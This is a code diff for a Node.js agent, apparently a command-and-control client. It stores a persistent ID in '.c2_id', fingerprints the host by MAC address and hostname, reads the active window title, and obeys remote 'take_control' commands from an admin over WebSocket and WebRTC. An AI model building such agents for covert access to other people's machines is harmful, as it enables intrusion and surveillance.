@@ -70,26 +70,14 @@ const MAX_RECONNECT_ATTEMPTS = 10;
 let isConnected = false;
 let isSessionActive = false;
 
-// Persistence Logic - STABLE ID GENERATION
-const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id'); // Fixed typo: tmpdir vs tmpid
+// Persistence Logic
+const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 try {
  if (fs.existsSync(PERSIST_FILE)) {
  myId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
  log(`[ID] Loaded existing ID: ${myId}`);
- } else {
- // Generate stable ID once
- const mac = getMacAddress();
- const hostname = os.hostname();
- myId = crypto.createHash('sha256').update(mac + hostname).digest('hex').substr(0, 8);
- try {
- fs.writeFileSync(PERSIST_FILE, myId);
- log(`[ID] Generated new persistent ID: ${myId}`);
- } catch(e) {}
  }
-} catch(e) {
- // Fallback if read/write fails
- myId = crypto.randomBytes(4).toString('hex');
-}
+} catch(e) {}
 
 // --- WEBRTC VARIABLES ---
 let peerConnection = null;
@@ -105,6 +93,14 @@ function initConnection() {
  ws.on('open', () => {
  reconnectAttempts = 0;
  isConnected = true;
+ 
+ if (!myId) {
+ const mac = getMacAddress();
+ myId = crypto.createHash('sha256').update(mac + os.hostname()).digest('hex').substr(0, 8);
+ try {
+ fs.writeFileSync(PERSIST_FILE, myId);
+ } catch(e) {}
+ }
  
  log(`[WS] Connected with ID: ${myId}`);
 
@@ -129,11 +125,11 @@ function initConnection() {
  if (data.type === 'take_control') takeControl(true);
  else if (data.type === 'release_control') takeControl(false);
  else if (data.type === 'request_join') {
- log(`[JOIN] Request join received from Admin: ${data.from}`);
+ log(`[JOIN] Request join received from ${data.from}`);
  handleJoinRequest(data.from);
  } else if (data.type === 'start_join') {
  // Explicitly start the join process when requested by admin
- log(`[JOIN] Starting join initiated by Admin: ${data.from}`);
+ log(`[JOIN] Starting join initiated by ${data.from}`);
  handleJoinRequest(data.from);
  } else if (data.type === 'offer') {
  log(`[SIG] Received Offer from Admin`);
@@ -363,6 +359,7 @@ async function getCurrentWindowTitle() {
  } else if (platform === 'darwin') {
  cmd = 'osascript -e \'tell application "System Events" to get name of first item of (get every process whose frontmost is true)\'';
  } else {
+ // Removed generic linux fallback that was causing issues
  cmd = 'xdotool getwindowfocus getwindowname';
  }
  exec(cmd, (err, stdout) => {
